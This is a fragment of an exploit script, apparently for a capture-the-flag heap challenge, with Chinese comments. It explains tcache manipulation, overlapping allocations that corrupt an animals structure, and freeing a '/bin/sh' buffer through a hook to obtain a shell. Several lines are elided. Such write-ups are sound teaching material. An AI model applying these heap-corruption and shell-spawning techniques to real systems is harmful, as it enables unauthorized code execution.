...
buy(0, 0x410, 'dummy') # tcache 不能leak?
...
if sys.argv[1] == '1':
    # 2. buy的動作取得上面的animals[1], 又length malloc的那一塊是 0x30 chunck, 
    # 所以會get到上面的animals[0]，
    #    所以寫入animals[1]->name就是在寫入animals[0]
    #    animals[0] 覆蓋情況
    ...
    #    會這樣寫入  可以參考 bark的參數  想改成 execv( ,NULL,NULL)
    ...
    buy(1, 0x20, 'dummy')
    # release(1)
    # 3. 蓋寫 animals[0] 的 key 時需注意 release() 也會釋放 name 欄位，因此要塞入一個合法的 chunk (0xb40) 位址
    # 下面只需要擇一個就好
    # change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb40), False)
    # 這邊free這個是因為要讓下面 buy 的name的那塊mem 會重 tcache拿,因為如果這邊沒有
    # free , tcache 0x30的count就只有1 ,下面 要allocate Name的時候不會重tcache拿
    release(1)
    ...
    # 5. get shell
    # free 上面存了/bin/sh 的 memory ->hook("/bin/sh/")
    release(1)
else:
    print("NO :(")
    r.close()
